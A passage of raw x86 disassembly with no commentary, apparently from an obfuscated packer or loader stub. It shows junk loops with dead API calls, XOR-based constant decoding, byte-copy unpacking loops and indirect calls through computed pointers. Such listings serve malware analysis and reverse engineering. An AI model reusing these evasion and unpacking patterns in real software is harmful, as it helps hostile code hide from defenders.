  422e8b:	jne    0x422e99
  422e91:	push   0x1
  422e93:	call   DWORD PTR ds:0x42502c
  422e99:	cmp    DWORD PTR ds:0x42a3e9,0x18
  422ea0:	jb     0x422e77
  422ea6:	and    DWORD PTR ds:0x42a3dd,0x0
  422eb0:	xor    edi,edi
  422eb2:	or     edi,DWORD PTR ds:0x42a3dd
  422eb8:	inc    edi
  422eb9:	mov    DWORD PTR ds:0x42a3dd,edi
  422ebf:	cmp    DWORD PTR ds:0x42a3dd,0x4
  422ec6:	jne    0x422ed5
  422ecc:	push   DWORD PTR [ebp-0x28]
  422ecf:	call   DWORD PTR ds:0x425014
  422ed5:	cmp    DWORD PTR ds:0x42a3dd,0x3
  422edc:	jne    0x422ef1
  422ee2:	xor    edi,edi
  422ee4:	xor    edi,DWORD PTR ds:0x42a3dd
  422eea:	inc    edi
  422eeb:	mov    DWORD PTR ds:0x42a3dd,edi
  422ef1:	cmp    DWORD PTR ds:0x42a3dd,0x14
  422ef8:	jb     0x422eb0
  422efe:	mov    esi,0x7510850
  422f03:	xor    eax,esi
  422f05:	adc    DWORD PTR ds:0x42a3ad,0x42a311
  422f0f:	mov    edi,0x327298
  422f14:	and    DWORD PTR ds:0x42a2c5,0x0
  422f1e:	jmp    0x422f30
  422f23:	mov    ebx,DWORD PTR ds:0x42a2c5
  422f29:	inc    ebx
  422f2a:	mov    DWORD PTR ds:0x42a2c5,ebx
  422f30:	cmp    DWORD PTR ds:0x42a2c5,0x1f
  422f37:	jae    0x422f5a
  422f3d:	cmp    DWORD PTR ds:0x42a2c5,0x29
  422f44:	jne    0x422f55
  422f4a:	push   0x4205
  422f4f:	call   DWORD PTR ds:0x425030
  422f55:	jmp    0x422f23
  422f5a:	add    eax,edi
  422f5c:	mov    DWORD PTR [ecx],eax
  422f5e:	mov    eax,ds:0x426cfe
  422f63:	cmp    eax,0x22b01f34
  422f68:	movzx  ebx,BYTE PTR ds:0x42a3a5
  422f6f:	mov    eax,DWORD PTR [ebp-0x4]
  422f72:	mov    ebx,0xf89c853c
  422f77:	je     0x422fb3
  422f7d:	sbb    ecx,0x61f7
  422f83:	mov    ecx,DWORD PTR [ebp-0x8]
  422f86:	xor    eax,esi
  422f88:	xor    DWORD PTR ds:0x42a2d9,0x5cd8
  422f92:	add    eax,edi
  422f94:	or     DWORD PTR ds:0x42a2cd,0x42a3d5
  422f9e:	imul   eax,ecx
  422fa1:	mov    DWORD PTR [ebp-0x8],eax
  422fa4:	mov    DWORD PTR ds:0x42a329,0x5f87
  422fae:	jmp    0x423007
  422fb3:	xor    eax,esi
  422fb5:	or     DWORD PTR ds:0x42a32d,ebx
  422fbb:	add    eax,edi
  422fbd:	add    DWORD PTR ds:0x42a3ad,edi
  422fc3:	mov    ds:0x426bd6,eax
  422fc8:	mov    eax,DWORD PTR [ebp-0x8]
  422fcb:	inc    DWORD PTR ds:0x42a32d
  422fd1:	xor    eax,esi
  422fd3:	add    eax,edi
  422fd5:	inc    ecx
  422fd6:	mov    ds:0x426cfe,eax
  422fdb:	mov    eax,DWORD PTR [ebp-0x4]
  422fde:	sub    DWORD PTR ds:0x42a3ad,0x42a365
  422fe8:	mov    ecx,DWORD PTR ds:0x426bd6
  422fee:	xor    eax,esi
  422ff0:	add    eax,edi
  422ff2:	cmp    ecx,eax
  422ff4:	jne    0x423007
  422ffa:	push   ebx
  422ffb:	push   DWORD PTR [ebp-0x4]
  422ffe:	push   DWORD PTR [ebp-0x8]
  423001:	call   DWORD PTR ds:0x426bce
  423007:	mov    eax,ds:0x426ac2
  42300c:	mov    eax,DWORD PTR [eax+0x18c]
  423012:	mov    eax,DWORD PTR [eax]
  423014:	mov    DWORD PTR [ebp-0x3c],eax
  423017:	mov    DWORD PTR [ebp-0x34],ebx
  42301a:	mov    DWORD PTR [ebp-0x34],ebx
  42301d:	mov    DWORD PTR [ebp-0x34],ebx
  423020:	mov    DWORD PTR [ebp-0x2c],0xf89c8538
  423027:	mov    DWORD PTR [ebp-0x34],ebx
  42302a:	mov    DWORD PTR [ebp-0x34],0xf89c8520
  423031:	mov    eax,DWORD PTR [ebp-0x8]
  423034:	xor    eax,esi
  423036:	add    eax,edi
  423038:	jmp    0x423104
  42303d:	mov    ecx,DWORD PTR [ebp-0x4]
  423040:	xor    ecx,esi
  423042:	lea    ecx,[ecx+eax*1+0x327298]
  423049:	mov    DWORD PTR [ebp-0x18],ecx
  42304c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42304f:	xor    ecx,esi
  423051:	lea    ecx,[ebp+ecx*1+0x3272a0]
  423058:	mov    DWORD PTR [ebp-0x34],ecx
  42305b:	mov    ecx,DWORD PTR ds:0x426ac2
  423061:	mov    ecx,DWORD PTR [ecx+0x1bc]
  423067:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  42306e:	mov    DWORD PTR [ebp-0x30],ecx
  423071:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  423078:	mov    ecx,DWORD PTR [ebp-0x14]
  42307b:	mov    edx,DWORD PTR [ebp-0x18]
  42307e:	xor    ecx,esi
  423080:	add    ecx,edi
  423082:	cmp    edx,ecx
  423084:	je     0x4230f8
  42308a:	mov    ecx,DWORD PTR [ebp-0x14]
  42308d:	mov    edx,DWORD PTR [ebp-0xc]
  423090:	xor    edx,esi
  423092:	mov    ebx,0xffcd8d68
  423097:	sub    ebx,edx
  423099:	add    ebx,DWORD PTR [ebp-0x18]
  42309c:	xor    ecx,esi
  42309e:	add    ecx,edi
  4230a0:	mov    DWORD PTR [ebp-0x24],ecx
  4230a3:	cmp    ecx,ebx
  4230a5:	ja     0x4230f8
  4230ab:	mov    eax,DWORD PTR [ebp-0x14]
  4230ae:	mov    edx,DWORD PTR [ebp-0xc]
  4230b1:	xor    edx,esi
  4230b3:	add    edx,edi
  4230b5:	imul   edx,ecx
  4230b8:	xor    eax,esi
  4230ba:	add    eax,ecx
  4230bc:	mov    ecx,DWORD PTR [ebp-0x30]
  4230bf:	mov    ebx,DWORD PTR [ebp-0x34]
  4230c2:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4230c9:	mov    BYTE PTR [edx+ecx*1],al
  4230cc:	mov    eax,DWORD PTR [ebp-0xc]
  4230cf:	mov    ecx,DWORD PTR [ebp-0x24]
  4230d2:	xor    eax,esi
  4230d4:	lea    ecx,[ecx+eax*1+0x327298]
  4230db:	mov    eax,DWORD PTR [ebp-0xc]
  4230de:	xor    eax,esi
  4230e0:	mov    edx,0xffcd8d68
  4230e5:	sub    edx,eax
  4230e7:	add    edx,DWORD PTR [ebp-0x18]
  4230ea:	mov    DWORD PTR [ebp-0x24],ecx
  4230ed:	cmp    ecx,edx
  4230ef:	jbe    0x4230ab
  4230f5:	mov    eax,DWORD PTR [ebp-0x28]
  4230f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4230fb:	xor    ecx,esi
  4230fd:	lea    eax,[eax+ecx*1+0x327298]
  423104:	mov    ecx,DWORD PTR [ebp-0x4]
  423107:	mov    edx,DWORD PTR [ebp-0x4]
  42310a:	xor    edx,esi
  42310c:	xor    ecx,esi
  42310e:	add    ecx,edx
  423110:	mov    edx,DWORD PTR [ebp-0x4]
  423113:	xor    edx,esi
  423115:	lea    ecx,[ecx+edx*1+0x9757c8]
  42311c:	mov    DWORD PTR [ebp-0x28],eax
  42311f:	cmp    eax,ecx
  423121:	jbe    0x42303d
  423127:	mov    eax,DWORD PTR [ebp+0xc]
  42312a:	mov    ds:0x426946,eax
  42312f:	mov    eax,DWORD PTR [ebp+0x10]
  423132:	mov    ds:0x426b9a,eax
  423137:	mov    eax,ds:0x426946
  42313c:	mov    ecx,DWORD PTR [ebp-0x38]
  42313f:	push   DWORD PTR [ebp-0x3c]
  423142:	sub    eax,edi
  423144:	push   DWORD PTR [ebp-0x1c]
  423147:	xor    eax,esi
  423149:	mov    DWORD PTR [ecx],eax
  42314b:	push   DWORD PTR [ebp-0x20]
  42314e:	call   0x424188
  423153:	sub    eax,edi
  423155:	xor    eax,esi
  423157:	mov    DWORD PTR [ebp+0xc],eax
  42315a:	mov    ecx,DWORD PTR [ebp-0x4]
  42315d:	mov    eax,DWORD PTR [ebp+0xc]
  423160:	xor    ecx,esi
  423162:	add    ecx,edi
  423164:	xor    edx,edx
  423166:	div    ecx
  423168:	mov    ecx,DWORD PTR [ebp-0x8]
  42316b:	cmp    ecx,eax
  42316d:	jne    0x423178
  423173:	call   0x401000
  423178:	lea    eax,[ebp+0x4]
  42317b:	mov    DWORD PTR [ebp-0x40],eax
  42317e:	mov    eax,ds:0x426ac2
  423183:	add    eax,0x1cc
  423188:	mov    DWORD PTR [ebp-0x34],eax
  42318b:	lea    eax,[ebp-0x10]
  42318e:	mov    DWORD PTR [ebp+0x10],0xf89c8538
  423195:	mov    DWORD PTR [ebp-0x38],eax
  423198:	mov    DWORD PTR [ebp+0xc],0xf89c8539
  42319f:	mov    eax,DWORD PTR [ebp+0x10]
  4231a2:	xor    eax,esi
  4231a4:	mov    DWORD PTR [ebp-0x18],0x4
  4231ab:	mov    ecx,DWORD PTR [ebp-0x18]
  4231ae:	add    eax,edi
  4231b0:	cmp    ecx,eax
  4231b2:	je     0x42320e
  4231b8:	mov    eax,DWORD PTR [ebp+0x10]
  4231bb:	xor    eax,esi
  4231bd:	add    eax,edi
  4231bf:	jmp    0x4231f4
  4231c4:	mov    ecx,DWORD PTR [ebp+0x10]
  4231c7:	mov    edx,DWORD PTR [ebp+0xc]
  4231ca:	xor    edx,esi
  4231cc:	add    edx,edi
  4231ce:	imul   edx,eax
  4231d1:	xor    ecx,esi
  4231d3:	add    ecx,eax
  4231d5:	mov    eax,DWORD PTR [ebp-0x38]
  4231d8:	mov    ebx,DWORD PTR [ebp-0x34]
  4231db:	mov    cl,BYTE PTR [ebx+ecx*1+0x327298]
  4231e2:	mov    BYTE PTR [edx+eax*1],cl
  4231e5:	mov    eax,DWORD PTR [ebp+0xc]
  4231e8:	mov    ecx,DWORD PTR [ebp-0x28]
  4231eb:	xor    eax,esi
  4231ed:	lea    eax,[ecx+eax*1+0x327298]
  4231f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4231f7:	xor    ecx,esi
  4231f9:	mov    edx,0xffcd8d68
  4231fe:	sub    edx,ecx
  423200:	add    edx,DWORD PTR [ebp-0x18]
  423203:	mov    DWORD PTR [ebp-0x28],eax
  423206:	cmp    eax,edx
  423208:	jbe    0x4231c4
  42320e:	mov    eax,DWORD PTR [ebp-0x10]
  423211:	mov    eax,DWORD PTR [ebp-0x4]
  423214:	push   DWORD PTR [ebp-0x8]
  423217:	lea    eax,[ebp-0x40]
  42321a:	push   eax
  42321b:	call   0x424700
  423220:	mov    eax,DWORD PTR [ebp-0x10]
  423223:	mov    eax,DWORD PTR [eax]
  423225:	pop    edi
  423226:	pop    esi
  423227:	pop    ebx
  423228:	leave  
  423229:	ret    0xc
  42322c:	push   ebp
  42322d:	mov    ebp,esp
  42322f:	push   ecx
  423230:	mov    DWORD PTR ds:0x42a2dd,0x65b6
  42323a:	push   ecx
  42323b:	movzx  ecx,WORD PTR ds:0x42a3d9
  423242:	mov    eax,0x5a3fc9f
  423247:	mov    DWORD PTR [ebp-0x4],eax
  42324a:	mov    ecx,DWORD PTR ds:0x42a351
  423250:	mov    ecx,DWORD PTR [ebp-0x4]
  423253:	mov    DWORD PTR [ebp-0x8],0x4f35
  42325a:	mov    DWORD PTR ds:0x42a3ad,0x699b
  423264:	cmp    ecx,eax
  423266:	jne    0x423307
  42326c:	mov    ax,WORD PTR [ebp-0x8]
  423270:	mov    DWORD PTR ds:0x42a3e9,0x1e
  42327a:	cmp    DWORD PTR ds:0x42a3e9,0x0
  423281:	je     0x4232c8
  423287:	cmp    DWORD PTR ds:0x42a3e9,0xf
  42328e:	jne    0x42329a
  423294:	call   DWORD PTR ds:0x4251f0
  42329a:	cmp    DWORD PTR ds:0x42a3e9,0x10
  4232a1:	jne    0x4232b6
  4232a7:	xor    ecx,ecx
  4232a9:	or     ecx,DWORD PTR ds:0x42a3e9
  4232af:	dec    ecx
  4232b0:	mov    DWORD PTR ds:0x42a3e9,ecx
  4232b6:	mov    ecx,DWORD PTR ds:0x42a3e9
  4232bc:	dec    ecx
  4232bd:	mov    DWORD PTR ds:0x42a3e9,ecx
  4232c3:	jmp    0x42327a
  4232c8:	mov    ecx,0x8a36
  4232cd:	xor    ax,cx
  4232d0:	mov    ecx,0x3afc
  4232d5:	add    ax,cx
  4232d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4232db:	movzx  eax,ax
  4232de:	not    eax
  4232e0:	and    eax,DWORD PTR [ecx]
  4232e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4232e5:	mov    DWORD PTR [ecx],eax
  4232e7:	jmp    0x4232f3
  4232ec:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  4232f3:	mov    ax,WORD PTR [ebp-0x8]
  4232f7:	push   DWORD PTR [ebp+0x8]
  4232fa:	call   0x42330b
  4232ff:	test   eax,eax
  423301:	je     0x4232ec
  423307:	leave  
  423308:	ret    0x4
  42330b:	push   ebp
  42330c:	mov    ebp,esp
  42330e:	sub    esp,0x2c
  423311:	adc    DWORD PTR ds:0x42a3e5,0x7c56
  42331b:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  423322:	mov    eax,ds:0x42a311
  423327:	and    DWORD PTR ds:0x42a2b9,eax
  42332d:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  423334:	mov    ecx,DWORD PTR ds:0x42a33d
  42333a:	mov    ecx,DWORD PTR [ecx]
  42333c:	sub    DWORD PTR ds:0x42a319,ecx
  423342:	mov    eax,0x9567
  423347:	movzx  ecx,BYTE PTR ds:0x42a2cd
  42334e:	add    DWORD PTR ds:0x42a2dd,ecx
  423354:	mov    WORD PTR [ebp-0x4],ax
  423358:	sub    DWORD PTR ds:0x42a3d5,edi
  42335e:	lea    eax,[ebp-0x24]
  423361:	and    ecx,DWORD PTR ds:0x42a361
  423367:	mov    DWORD PTR [ebp-0x28],eax
  42336a:	xor    DWORD PTR ds:0x42a325,0xe76
  423374:	mov    eax,DWORD PTR [ebp+0x8]
  423377:	adc    DWORD PTR ds:0x42a3ad,ecx
  42337d:	mov    DWORD PTR [ebp-0x20],eax
  423380:	push   ebx
  423381:	and    DWORD PTR ds:0x42a329,0x0
  42338b:	jmp    0x42339d
  423390:	mov    ecx,DWORD PTR ds:0x42a329
  423396:	inc    ecx
  423397:	mov    DWORD PTR ds:0x42a329,ecx
  42339d:	cmp    DWORD PTR ds:0x42a329,0x1c
  4233a4:	jae    0x423447
  4233aa:	cmp    DWORD PTR ds:0x42a329,0x5
  4233b1:	jne    0x4233d3
  4233b7:	push   DWORD PTR [ebp-0x10]
  4233ba:	push   0x7dd5
  4233bf:	push   DWORD PTR [ebp-0x14]
  4233c2:	push   DWORD PTR [ebp-0x14]
  4233c5:	push   DWORD PTR [ebp-0x28]
  4233c8:	push   0x2385
  4233cd:	call   DWORD PTR ds:0x4251f4
  4233d3:	cmp    DWORD PTR ds:0x42a329,0x4
  4233da:	jne    0x4233ef
  4233e0:	xor    ecx,ecx
  4233e2:	add    ecx,DWORD PTR ds:0x42a329
  4233e8:	inc    ecx
  4233e9:	mov    DWORD PTR ds:0x42a329,ecx
  4233ef:	jmp    0x423390
  4233f4:	and    DWORD PTR ds:0x42a3d9,0x0
  4233fe:	mov    ebx,DWORD PTR ds:0x42a3d9
  423404:	inc    ebx
  423405:	mov    DWORD PTR ds:0x42a3d9,ebx
  42340b:	cmp    DWORD PTR ds:0x42a3d9,0x2a
  423412:	jne    0x423434
  423418:	push   DWORD PTR [ebp-0xc]
  42341b:	push   DWORD PTR [ebp-0x24]
  42341e:	push   DWORD PTR [ebp-0x10]
  423421:	push   DWORD PTR [ebp-0x28]
  423424:	push   0x4619
  423429:	push   0x8205
  42342e:	call   DWORD PTR ds:0x42536c
  423434:	cmp    DWORD PTR ds:0x42a3d9,0x1c
  42343b:	jb     0x4233fe
  423441:	adc    DWORD PTR ds:0x42a2d9,ebx
  423447:	lea    eax,[ebp-0x18]
  42344a:	xor    ebx,ebx
  42344c:	xor    ebx,DWORD PTR ds:0x42a305
  423452:	mov    ecx,DWORD PTR ds:0x42a389
  423458:	sub    ebx,ecx
  42345a:	and    ebx,DWORD PTR [ebx+ecx*1]
  42345d:	mov    DWORD PTR [ebp-0x1c],eax
  423460:	dec    ecx
  423461:	mov    eax,DWORD PTR [ebp-0x1c]
  423464:	xor    DWORD PTR ds:0x42a39d,ebx
  42346a:	push   esi
  42346b:	adc    ebx,0x6bc2
  423471:	push   edi
  423472:	sbb    DWORD PTR ds:0x42a3dd,edx
  423478:	mov    edi,0xf89f2e50
  42347d:	and    ecx,esi
  42347f:	mov    DWORD PTR [eax],edi
  423481:	and    DWORD PTR ds:0x42a32d,0x0
  42348b:	mov    ebx,DWORD PTR ds:0x42a32d
  423491:	inc    ebx
  423492:	mov    DWORD PTR ds:0x42a32d,ebx
  423498:	cmp    DWORD PTR ds:0x42a32d,0xa
  42349f:	jne    0x4234ab
  4234a5:	call   DWORD PTR ds:0x425034
  4234ab:	cmp    DWORD PTR ds:0x42a32d,0x9
  4234b2:	jne    0x4234c5
  4234b8:	mov    ebx,DWORD PTR ds:0x42a32d
  4234be:	inc    ebx
  4234bf:	mov    DWORD PTR ds:0x42a32d,ebx
  4234c5:	cmp    DWORD PTR ds:0x42a32d,0x11
  4234cc:	jb     0x42348b
  4234d2:	mov    eax,DWORD PTR [ebp-0x14]
  4234d5:	mov    ecx,DWORD PTR ds:0x42a3b9
  4234db:	xor    esi,esi
  4234dd:	or     esi,DWORD PTR ds:0x42a3c9
  4234e3:	sub    ecx,esi
  4234e5:	or     ecx,DWORD PTR [ecx+esi*1]
  4234e8:	mov    ebx,DWORD PTR [ebp-0x8]
  4234eb:	mov    ecx,0x7510850
  4234f0:	sbb    DWORD PTR ds:0x42a2d5,0x30f6
  4234fa:	xor    eax,ecx
  4234fc:	sub    esi,DWORD PTR ds:0x42a2c1
  423502:	mov    esi,0x327298
  423507:	xor    ebx,ecx
  423509:	and    DWORD PTR ds:0x42a351,0x225a
  423513:	xor    edx,edx
  423515:	add    eax,esi
  423517:	adc    DWORD PTR ds:0x42a3dd,0x42a391
  423521:	add    ebx,esi
  423523:	or     DWORD PTR ds:0x42a369,0x31e2
  42352d:	div    ebx
  42352f:	mov    edx,DWORD PTR [ebp-0x20]
  423532:	mov    DWORD PTR [ebp-0x2c],0x4f35
  423539:	cmp    eax,DWORD PTR [edx]
  42353b:	je     0x42364a
  423541:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  423548:	lea    eax,[ebp-0xc]
  42354b:	mov    DWORD PTR [ebp-0x10],eax
  42354e:	mov    eax,DWORD PTR [ebp-0x10]
  423551:	mov    edx,DWORD PTR [eax]
  423553:	imul   edx,edx,0xf89ea9ed
  423559:	mov    DWORD PTR [eax],edx
  42355b:	mov    eax,DWORD PTR [ebp-0xc]
  42355e:	cmp    eax,0x82927a76
  423563:	je     0x423580
  423569:	mov    eax,DWORD PTR [ebp-0x1c]
  42356c:	or     DWORD PTR [eax],0x60751c9d
  423572:	mov    eax,DWORD PTR [ebp-0x8]
  423575:	xor    eax,ecx
  423577:	add    eax,esi
  423579:	pop    edi
  42357a:	pop    esi
  42357b:	pop    ebx
  42357c:	leave  
  42357d:	ret    0x4
  423580:	mov    eax,DWORD PTR [ebp-0xc]
  423583:	add    eax,DWORD PTR [ebp-0x18]
  423586:	cmp    eax,0x7b31a8c6
  42358b:	je     0x42359f
  423591:	mov    eax,DWORD PTR [ebp-0x10]
  423594:	and    DWORD PTR [eax],0x751c80
  42359a:	jmp    0x423572
  42359f:	mov    eax,DWORD PTR [ebp-0xc]
  4235a2:	mov    edx,DWORD PTR [ebp-0x18]
  4235a5:	or     eax,edx
  4235a7:	cmp    eax,0xfa9f7e76
  4235ac:	je     0x4235c0
  4235b2:	mov    eax,DWORD PTR [ebp-0x10]
  4235b5:	xor    DWORD PTR [eax],0x2650fa8e
  4235bb:	jmp    0x423572
  4235c0:	mov    ax,WORD PTR [ebp-0x4]
  4235c4:	mov    edi,DWORD PTR [ebp+0x8]
  4235c7:	mov    edi,DWORD PTR [edi]
  4235c9:	mov    edx,0x8a36
  4235ce:	xor    ax,dx
  4235d1:	mov    edx,0x3afc
  4235d6:	add    ax,dx
  4235d9:	cmp    ax,WORD PTR [edi]
  4235dc:	je     0x423629
  4235e2:	mov    eax,DWORD PTR [ebp-0x14]
  4235e5:	xor    eax,ecx
  4235e7:	add    eax,esi
  4235e9:	mov    DWORD PTR [ebp-0x24],eax
  4235ec:	mov    eax,DWORD PTR [ebp-0x28]
  4235ef:	mov    di,WORD PTR [ebp-0x2c]
  4235f3:	mov    ebx,0x8a36
  4235f8:	xor    di,bx
  4235fb:	add    di,dx
  4235fe:	movzx  edx,di
  423601:	mov    edi,DWORD PTR [ebp-0x8]
  423604:	xor    edi,ecx
  423606:	lea    edx,[edx+edi*1+0x327298]
  42360d:	add    DWORD PTR [eax],edx
  42360f:	mov    eax,DWORD PTR [ebp-0x20]
  423612:	mov    edx,DWORD PTR [ebp-0x8]
  423615:	mov    edi,DWORD PTR [ebp-0x24]
  423618:	xor    edx,ecx
  42361a:	add    edx,esi
  42361c:	imul   edx,edi
  42361f:	sub    DWORD PTR [eax],edx
  423621:	mov    eax,DWORD PTR [ebp-0x14]
  423624:	jmp    0x423575
  423629:	mov    eax,DWORD PTR [ebp-0xc]
  42362c:	mov    edx,DWORD PTR [ebp-0x18]
  42362f:	xor    eax,edx
  423631:	cmp    eax,0x7a0d5426
  423636:	je     0x423572
  42363c:	mov    eax,DWORD PTR [ebp-0x10]
  42363f:	add    DWORD PTR [eax],0x7403502
  423645:	jmp    0x423572
  42364a:	mov    eax,DWORD PTR [ebp-0x1c]
  42364d:	cmp    DWORD PTR [eax],edi
  42364f:	je     0x423572
  423655:	mov    eax,0x800f1c81
  42365a:	jmp    0x423579
  42365f:	push   ebp
  423660:	mov    ebp,esp
  423662:	sub    esp,0x20
  423665:	movzx  eax,WORD PTR ds:0x42a365
  42366c:	add    DWORD PTR ds:0x42a369,eax
  423672:	mov    eax,ds:0x426ac2
  423677:	inc    ecx
  423678:	mov    eax,DWORD PTR [eax+0x198]
  42367e:	mov    ecx,DWORD PTR ds:0x42a2d9
  423684:	sbb    ecx,DWORD PTR ds:0x42a3e1
  42368a:	mov    DWORD PTR ds:0x42a2d9,ecx
  423690:	mov    DWORD PTR [ebp-0x8],eax
  423693:	mov    eax,DWORD PTR [ebp+0x8]
  423696:	mov    ecx,DWORD PTR [ebp-0x8]
  423699:	push   ebx
  42369a:	push   esi
  42369b:	and    DWORD PTR ds:0x42a31d,ebx
  4236a1:	mov    esi,0x7510850
  4236a6:	mov    ebx,DWORD PTR ds:0x42a3b9
  4236ac:	mov    ebx,DWORD PTR [ebx]
  4236ae:	adc    DWORD PTR ds:0x42a2dd,ebx
  4236b4:	xor    eax,esi
  4236b6:	adc    DWORD PTR ds:0x42a3dd,edi
  4236bc:	push   edi
  4236bd:	mov    edi,0x327298
  4236c2:	add    ebx,0x6f46
  4236c8:	add    eax,edi
  4236ca:	dec    DWORD PTR ds:0x42a32d
  4236d0:	mov    DWORD PTR [ecx],eax
  4236d2:	sub    ebx,DWORD PTR ds:0x42a361
  4236d8:	lea    eax,[ebp-0x4]
  4236db:	adc    DWORD PTR ds:0x42a32d,edx
  4236e1:	mov    DWORD PTR [ebp-0x10],eax
  4236e4:	mov    eax,DWORD PTR [ebp+0x8]
  4236e7:	mov    ecx,DWORD PTR [ebp-0x10]
  4236ea:	xor    eax,esi
  4236ec:	xor    ebx,0x10f8
  4236f2:	add    eax,edi
  4236f4:	mov    DWORD PTR [ecx],eax
  4236f6:	adc    DWORD PTR ds:0x42a319,ebx
  4236fc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  423703:	xor    ecx,ecx
  423705:	xor    ecx,DWORD PTR ds:0x42a3b5
  42370b:	mov    ebx,DWORD PTR ds:0x42a409
  423711:	sub    ebx,ecx
  423713:	or     ecx,DWORD PTR [ecx+ebx*1]
  423716:	lea    eax,[ebp-0x14]
  423719:	mov    DWORD PTR [ebp-0x20],eax
  42371c:	sbb    eax,0x5cc1
  423721:	mov    eax,DWORD PTR [ebp-0x14]
  423724:	mov    ecx,DWORD PTR [ebp-0x20]
  423727:	movzx  ebx,BYTE PTR ds:0x42a3d9
  42372e:	xor    ebx,DWORD PTR ds:0x42a2cd
  423734:	mov    DWORD PTR ds:0x42a3d9,ebx
  42373a:	xor    eax,esi
  42373c:	and    DWORD PTR ds:0x42a399,0x0
  423746:	xor    ebx,ebx
  423748:	or     ebx,DWORD PTR ds:0x42a399
  42374e:	inc    ebx
  42374f:	mov    DWORD PTR ds:0x42a399,ebx
  423755:	cmp    DWORD PTR ds:0x42a399,0x29
  42375c:	jne    0x423772
  423762:	push   0x42a2dd
  423767:	push   0x6420
  42376c:	call   DWORD PTR ds:0x4251f8
  423772:	cmp    DWORD PTR ds:0x42a399,0x19
  423779:	jb     0x423746
  42377f:	movzx  ebx,BYTE PTR ds:0x42a3a5
  423786:	or     DWORD PTR ds:0x42a3ed,ebx
  42378c:	add    eax,edi
  42378e:	and    DWORD PTR ds:0x42a36d,0x0
  423798:	jmp    0x4237aa
  42379d:	mov    ebx,DWORD PTR ds:0x42a36d
  4237a3:	inc    ebx
  4237a4:	mov    DWORD PTR ds:0x42a36d,ebx
  4237aa:	cmp    DWORD PTR ds:0x42a36d,0x1a
  4237b1:	jae    0x4237ed
  4237b7:	cmp    DWORD PTR ds:0x42a36d,0x1e
  4237be:	jne    0x4237de
  4237c4:	push   0x7bb6
  4237c9:	push   0x76ae
  4237ce:	push   0x616c
  4237d3:	push   0x1d5f
  4237d8:	call   DWORD PTR ds:0x4251fc
  4237de:	jmp    0x42379d
  4237e3:	sbb    DWORD PTR ds:0x42a3a1,0x6dc2
  4237ed:	mov    DWORD PTR [ecx],eax
  4237ef:	not    ebx
  4237f1:	mov    eax,ds:0x426b96
  4237f6:	sbb    DWORD PTR ds:0x42a3ed,0x4cd8
  423800:	mov    ebx,0x8e12febf
  423805:	and    DWORD PTR ds:0x42a395,0x42a2c1
  42380f:	mov    DWORD PTR [ebp-0xc],ebx
  423812:	mov    eax,DWORD PTR [eax]
  423814:	sub    DWORD PTR ds:0x42a391,0x42a2cd
  42381e:	mov    cx,WORD PTR [ebp-0x4]
  423822:	movzx  ecx,cx
  423825:	xor    DWORD PTR ds:0x42a2c5,0x42a2e1
  42382f:	add    ecx,DWORD PTR [eax]
  423831:	mov    DWORD PTR [ebp-0x18],ecx
  423834:	mov    eax,DWORD PTR [ebp+0x8]
  423837:	mov    ecx,DWORD PTR [ebp-0x8]
  42383a:	and    DWORD PTR ds:0x42a2e1,0x42a329
  423844:	xor    eax,esi
  423846:	add    DWORD PTR ds:0x42a39d,0x42a3dd
  423850:	add    eax,edi
  423852:	cmp    DWORD PTR [ecx],eax
  423854:	mov    DWORD PTR ds:0x42a31d,0x719a
  42385e:	jne    0x423a19
  423864:	mov    eax,DWORD PTR [ebp+0x8]
  423867:	adc    DWORD PTR ds:0x42a369,edx
  42386d:	mov    ecx,DWORD PTR [ebp-0x18]
  423870:	xor    eax,esi
  423872:	sbb    DWORD PTR ds:0x42a3d1,0x5040
  42387c:	add    eax,edi
  42387e:	cmp    DWORD PTR [ecx],eax
  423880:	mov    DWORD PTR ds:0x42a2c5,0x7a60
  42388a:	jne    0x4239c1
  423890:	and    DWORD PTR ds:0x42a2d1,0x0
  42389a:	jmp    0x4238ad
  42389f:	xor    eax,eax
  4238a1:	add    eax,DWORD PTR ds:0x42a2d1
  4238a7:	inc    eax
  4238a8:	mov    ds:0x42a2d1,eax
  4238ad:	cmp    DWORD PTR ds:0x42a2d1,0x17
  4238b4:	jae    0x423931
  4238ba:	cmp    DWORD PTR ds:0x42a2d1,0xb
  4238c1:	jne    0x4238d5
  4238c7:	push   0x42a311
  4238cc:	push   DWORD PTR [ebp-0x10]
  4238cf:	call   DWORD PTR ds:0x425370
  4238d5:	cmp    DWORD PTR ds:0x42a2d1,0xa
  4238dc:	jne    0x4238ed
  4238e2:	mov    eax,ds:0x42a2d1
  4238e7:	inc    eax
  4238e8:	mov    ds:0x42a2d1,eax
  4238ed:	jmp    0x42389f
  4238f2:	and    DWORD PTR ds:0x42a3a5,0x0
  4238fc:	mov    ecx,DWORD PTR ds:0x42a3a5
  423902:	inc    ecx
  423903:	mov    DWORD PTR ds:0x42a3a5,ecx
  423909:	cmp    DWORD PTR ds:0x42a3a5,0x27
  423910:	jne    0x423924
  423916:	push   DWORD PTR [ebp-0x18]
  423919:	push   0x6019
  42391e:	call   DWORD PTR ds:0x425038
  423924:	cmp    DWORD PTR ds:0x42a3a5,0x18
  42392b:	jb     0x4238fc
  423931:	mov    eax,DWORD PTR [ebp+0x8]
  423934:	mov    ecx,DWORD PTR [ebp-0x10]
  423937:	or     edx,DWORD PTR ds:0x42a369
  42393d:	xor    eax,esi
  42393f:	xor    edx,DWORD PTR ds:0x42a361
  423945:	add    eax,edi
  423947:	sbb    DWORD PTR ds:0x42a365,0x509f
  423951:	mov    DWORD PTR [ecx],eax
  423953:	and    DWORD PTR ds:0x42a3dd,0x0
  42395d:	jmp    0x42396d
  423962:	mov    eax,ds:0x42a3dd
  423967:	inc    eax
  423968:	mov    ds:0x42a3dd,eax
  42396d:	cmp    DWORD PTR ds:0x42a3dd,0x10
  423974:	jae    0x4239b0
  42397a:	cmp    DWORD PTR ds:0x42a3dd,0x8
  423981:	jne    0x423990
  423987:	push   DWORD PTR [ebp-0x28]
